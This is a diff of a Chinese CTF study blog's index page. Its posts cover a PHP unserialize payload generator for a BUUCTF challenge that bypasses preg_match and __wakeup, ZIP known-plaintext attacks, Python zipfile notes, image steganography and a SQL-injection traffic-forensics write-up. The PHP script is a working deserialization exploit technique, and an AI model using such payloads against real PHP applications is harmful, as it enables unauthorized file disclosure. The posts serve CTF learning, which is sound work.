+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chen</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chen</span> = serialize(<span class="variable">$chen</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$chen</span> =str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$chen</span>);   <span class="comment">#用+4替换4是为了绕过preg_match()的正则匹配</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$chen</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$chen</span>);     <span class="comment">#绕过__wakeup()魔术方法</span></span><br><span class="line"><span class="variable">$chen</span>=base64_encode(<span class="variable">$chen</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br\&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2022/04/21/W5AEkn3YVvBlhwK.png" alt="QQ图片20220421201238.png"></p>
+<h1 id="alter-可以弹出function的函数"><a href="#alter-可以弹出function的函数" class="headerlink" title="alter(_)可以弹出function的函数"></a>alter(_)可以弹出function的函数</h1><h2 id="如果成员的属性为private，所以要在类名和成员名之前加上-00这个url编码是空的意识。因为序列化时不会把空输出。"><a href="#如果成员的属性为private，所以要在类名和成员名之前加上-00这个url编码是空的意识。因为序列化时不会把空输出。" class="headerlink" title="如果成员的属性为private，所以要在类名和成员名之前加上%00这个url编码是空的意识。因为序列化时不会把空输出。"></a>如果成员的属性为private，所以要在类名和成员名之前加上%00这个url编码是空的意识。因为序列化时不会把空输出。</h2><p>例题：BUUCTF极客大挑战2019php1</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/08/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/08/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">明文攻击</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-03-08 18:26:01 / Geändert am: 19:11:18" itemprop="dateCreated datePublished" datetime="2022-03-08T18:26:01+08:00">2022-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">in</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>因为在misc审核考试中遇到了这一类题目，由于出题人说有手就行，于是我恶补了这一块内容</p>
+<h1 id="关于明文攻击一些不得不说的内容"><a href="#关于明文攻击一些不得不说的内容" class="headerlink" title="关于明文攻击一些不得不说的内容"></a>关于明文攻击一些不得不说的内容</h1><h2 id="明文攻击的条件："><a href="#明文攻击的条件：" class="headerlink" title="明文攻击的条件："></a>明文攻击的条件：</h2><p>一个压缩包，和拥有一个已知的存在压缩中出现的文件。</p>
+<h2 id="明文攻击的原理："><a href="#明文攻击的原理：" class="headerlink" title="明文攻击的原理："></a>明文攻击的原理：</h2><p>将已知文件进行ZIP加密后和待解密的ZIP里已知文件进行hex对比，两者的区别就是ZIP加密的三个key(压缩包中的每个文件都是通过这三个Key进行加密压缩的)，由此得到加密文件的三个key。（一个非常抽象的概念，就是由结果来推理过程吧）</p>
+<p>你输入的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字，如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。压缩软件用这3个key加密所有包中的文件，这也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的，我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known  plaintext。用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，但是我们已经可以用这个key解开所有的文件，所以已经满足我的要求了，而且要以前的密码也没什么用呀，我只要文件。</p>
+<h2 id="明文攻击的工具："><a href="#明文攻击的工具：" class="headerlink" title="明文攻击的工具："></a>明文攻击的工具：</h2><p>AZPR</p>
+<h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>1.zip</p>
+<p><img src="https://s2.loli.net/2022/03/08/ygYIGuEBMwbHUpv.png" alt="QQ截图20220308190551.png"></p>
+<p>查看文件，我们要解压的1.zip中也存在《青玉案元夕》于是我们用相同的方式进行压缩</p>
+<p>然后进行明文攻击。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/" class="post-title-link" itemprop="url">python之zipfile库</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+
+      <time title="Erstellt: 2022-03-02 09:59:38" itemprop="dateCreated datePublished" datetime="2022-03-02T09:59:38+08:00">2022-03-02</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Bearbeitet am</span>
+        <time title="Geändert am: 2022-03-03 10:31:28" itemprop="dateModified" datetime="2022-03-03T10:31:28+08:00">2022-03-03</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">in</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>**因为看到misc题目要手写脚本打开压缩包，于是想系统地学习一下python的zipfile模块，<del>顺便水一篇博客</del>**，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43677350/article/details/84071552?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考zipfile zip文件操作</a></p>
+<h1 id="zipfile"><a href="#zipfile" class="headerlink" title="zipfile"></a>zipfile</h1><h2 id="zipfile-getinfo-name"><a href="#zipfile-getinfo-name" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能：获取zip文档內指定对象文件的信息。返回一个zipfile.zipinfo对象，它包含文件的详细信息。</p>
+<h2 id="zipfile-infolist"><a href="#zipfile-infolist" class="headerlink" title="zipfile.infolist()"></a>zipfile.infolist()</h2><p>功能：获取zip文档內所有文件的信息返回一个zipfile.zipinfo列表</p>
+<h2 id="zipfile-namelist"><a href="#zipfile-namelist" class="headerlink" title="zipfile.namelist()"></a>zipfile.namelist()</h2><p>功能：获取zip文档內所有文件的名称列表。</p>
+<h2 id="zipfile-extract-memeber-path-pwd"><a href="#zipfile-extract-memeber-path-pwd" class="headerlink" title="zipfile.extract(memeber[,path[,pwd]])"></a>zipfile.extract(memeber[,path[,pwd]])</h2><p>功能：将zip文件內的制定文件解压到当前目录。</p>
+<p>参数：</p>
+<p>memeber      指定要解压的文件名称或对应的zipinfo对象</p>
+<p>path               指定解析文件保存的文件夹</p>
+<p>pwd                解压密码</p>
+<h2 id="zipfile-extractall-path-memebers-pwd"><a href="#zipfile-extractall-path-memebers-pwd" class="headerlink" title="zipfile.extractall([path[,memebers[,pwd]]])"></a>zipfile.extractall([path[,memebers[,pwd]]])</h2><p>功能：解压zip文档中的所有文件到当前目录。</p>
+<h2 id="zipfile-printdir"><a href="#zipfile-printdir" class="headerlink" title="zipfile.printdir()"></a>zipfile.printdir()</h2><p>功能：将zip文档內的信息打印到控制台上。</p>
+<h2 id="zipfile-setpassword-pwd"><a href="#zipfile-setpassword-pwd" class="headerlink" title="zipfile.setpassword(pwd)"></a>zipfile.setpassword(pwd)</h2><p>功能：设置zip文档的密码。</p>
+<h2 id="zipfile-read-name-pwd"><a href="#zipfile-read-name-pwd" class="headerlink" title="zipfile.read(name[,pwd])"></a>zipfile.read(name[,pwd])</h2><p>功能：获取zip文档指定文件的二进制数据。 </p>
+<h2 id="zipfile-getinfo-name-1"><a href="#zipfile-getinfo-name-1" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能返回一个zipinfo对象，表示zip文档中相对应的文件信息。</p>
+<p>支持以下属性：</p>
+<p>zipinfo.filename           获取文件的名称</p>
+<p>zipinfo.date_time        获取文件最后的修改时间。返回一个包含6个元素的元组：（年，月，日，时，分，秒）</p>
+<p>zipinfo.compress_type  压缩类型</p>
+<p>zipinfo.comment           文档说明</p>
+<p>zipinfo.extr                    文件的扩展数据</p>
+<p>zipinfo.create_system   获取创建文件的系统</p>
+<p>zipinfo.create_version   获取创建文件的PKZIP版本</p>
+<p>zipinfo.extract_versio      获取创建、解压zip文档的PKZIP所需要的PKZIP版本</p>
+<p>zipinfo.reserved               预留字段，当前实现总是返回0</p>
+<p>zipinfo.flag_bites              zip标志位</p>
+<p>zipinfo.volume                  文件头的卷标</p>
+<p>zipinfo.internal_attr           内部属性</p>
+<p>zipinfo.external_attr           外部属性</p>
+<p>zipinfo.header_offset          文件头偏移位</p>
+<p>zipinfo.CRC                        未压缩文件的CRC-32</p>
+<p>zipinfo.conpress_size          获取压缩后的大小</p>
+<p>zipinfo.file_size                     获取未压缩文件的大小</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/" class="post-title-link" itemprop="url">misc总结之图片隐写术</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+
+      <time title="Erstellt: 2022-02-27 12:46:16" itemprop="dateCreated datePublished" datetime="2022-02-27T12:46:16+08:00">2022-02-27</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Bearbeitet am</span>
+        <time title="Geändert am: 2022-03-01 19:32:30" itemprop="dateModified" datetime="2022-03-01T19:32:30+08:00">2022-03-01</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">in</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>内容参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1833">MISC总结—隐写术之图片隐写</a></p>
+<h1 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h1><ol>
+<li>附加件的图片隐写</li>
+<li>基于文件结构的图片隐写</li>
+<li>基于LSB原理的图片隐写</li>
+<li>基于DCT域的JPG图片隐写</li>
+<li>数字水印的隐写</li>
+<li>图片容差的隐写</li>
+</ol>
+<h1 id="第一部分-附加的图片隐写"><a href="#第一部分-附加的图片隐写" class="headerlink" title="第一部分 附加的图片隐写"></a>第一部分 附加的图片隐写</h1><p>在附加式的图片隐写术中，我们通常是用某种程序或者某种方法在裁体的文件中直接加上需要隐写的目标，然后将截体文件直接传输到接收者或者发布到网站上然后接收者根据方法提取出被隐写的对象，这一个过程就是我们这里想提到的附加图片隐写。</p>
+<p>而在CTF赛事中，关于这种图片隐写的大概有两种经典方法，一是直接附加字符串，二是图种的形式出现</p>
+<ol>
+<li>用binwalk来打开</li>
+</ol>
+<p><img src="https://s2.loli.net/2022/03/01/kNydwRV14BJz2H6.png" alt="QQ截图20220301185619.png"></p>
+<p><img src="https://s2.loli.net/2022/03/01/LS9dgk3inla5QXz.jpg" alt="cqzb.jpg"></p>
+<p>就能得到</p>
+<p><img src="https://s2.loli.net/2022/03/01/oH239L6ycYkbQdm.png" alt="QQ截图20220301185751.png"></p>
+<p>利用linux的strings命令，对该图片进行处理</p>
+<p><img src="https://s2.loli.net/2022/03/01/RU8xagd4e1hk95V.jpg" alt="ctf.jpg"></p>
+<p>可以提取出字符串ZmxhZ3t3ZWxjb21lX3RvX3hpYW56aGl9</p>
+<p><img src="https://s2.loli.net/2022/03/01/xGvKqLwdYznQmAU.png" alt="QQ截图20220301191713.png"></p>
+<p>利用base64解密</p>
+<p><img src="https://s2.loli.net/2022/03/01/YOmQu87VwUok2vi.png" alt="QQ截图20220301192936.png"></p>
+<p>就可以看到flag。</p>
+<p><img src="https://s2.loli.net/2022/03/01/d2tOADlb7Kq4m6F.png" alt="QQ截图20220301193040.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/26/misc%E8%80%83%E6%A0%B8/" class="post-title-link" itemprop="url">misc考核</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-02-26 15:56:43 / Geändert am: 16:23:38" itemprop="dateCreated datePublished" datetime="2022-02-26T15:56:43+08:00">2022-02-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">in</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="一道目标明确的流量包取证"><a href="#一道目标明确的流量包取证" class="headerlink" title="一道目标明确的流量包取证"></a>一道目标明确的流量包取证</h1><p>首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息</p>
+<p><img src="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png" alt="QQ截图20220226104603.png"></p>
+<p>然后就打开ok后缀的请求包（肯定是从后往前找）</p>
+<p>率先找到后半段flag</p>
+<img src="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png" alt="QQ截图20220226101554.png" style="zoom:200%;" />
+
+<p>往前找还有前半段</p>
+<img src="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png" alt="QQ截图20220226103012.png" style="zoom:200%;" />
+
+<p>千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9}</p>
+<p>之前在buu上刷过一题更难的一题，有点类似，是叫sqltest的基于get型的时间盲注的流量包取证有点小离谱</p>
+<h1 id="一道令人头皮发麻的签到："><a href="#一道令人头皮发麻的签到：" class="headerlink" title="一道令人头皮发麻的签到："></a>一道令人头皮发麻的签到：</h1><p>好！签到题，自信满满的打开，第一层解压：flag在里面哦</p>
+<p>第二层：打开看看（zip伪加密）</p>
+<p>第三层：你这么聪明看看就懂了  乱码，好！直接夹断😂</p>
+<p>原本想一个一个去试一试，试一下是啥编码的但是看到</p>
+<img src="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png" alt="QQ截图20220226161808.png" style="zoom;" />
+
+<p>5m在打开的一瞬间我的电脑卡了，所有的在线翻译网站都被搞爆了，就离谱😂</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/24/upload-libs(2)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/24/upload-libs(2)/" class="post-title-link" itemprop="url">upload-libs2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-02-24 11:51:46 / Geändert am: 11:57:26" itemprop="dateCreated datePublished" datetime="2022-02-24T11:51:46+08:00">2022-02-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">in</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/upload-libs/" itemprop="url" rel="index"><span itemprop="name">upload-libs</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="upload-libs-4-黑名单"><a href="#upload-libs-4-黑名单" class="headerlink" title="upload-libs 4 (黑名单)"></a>upload-libs 4 (黑名单)</h1><p><img src="https://s2.loli.net/2022/02/24/ZqJVp4rcituwjWg.png" alt="QQ截图20220224115441.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
   <nav class="pagination">
-    {{
-      paginator({
-        prev_text: '<i class="fa fa-angle-left" aria-label="' + __('accessibility.prev_page') + '"></i>',
-        next_text: '<i class="fa fa-angle-right" aria-label="' + __('accessibility.next_page') + '"></i>',
-        mid_size : 1,
-        escape   : false
-      })
-    }}
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
   </nav>
 
 </div>
@@ -70,14 +1031,37 @@
 
   <footer class="footer">
     <div class="footer-inner">
-{{ partial('_partials/footer.njk', {}, {cache: theme.cache.enable}) }}
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wang deshan</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
     </div>
   </footer>
 
-  {{ partial('_scripts/index.njk', {}, {cache: theme.cache.enable}) }}
-  {{ partial('_third-party/index.njk', {}, {cache: theme.cache.enable}) }}
-  {{ partial('_third-party/statistics/index.njk', {}, {cache: theme.cache.enable}) }}
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
-{{- next_inject('bodyEnd') }}
+  
+
+
+
+
+
+  
+
+
+
+
+
 </body>
 </html>
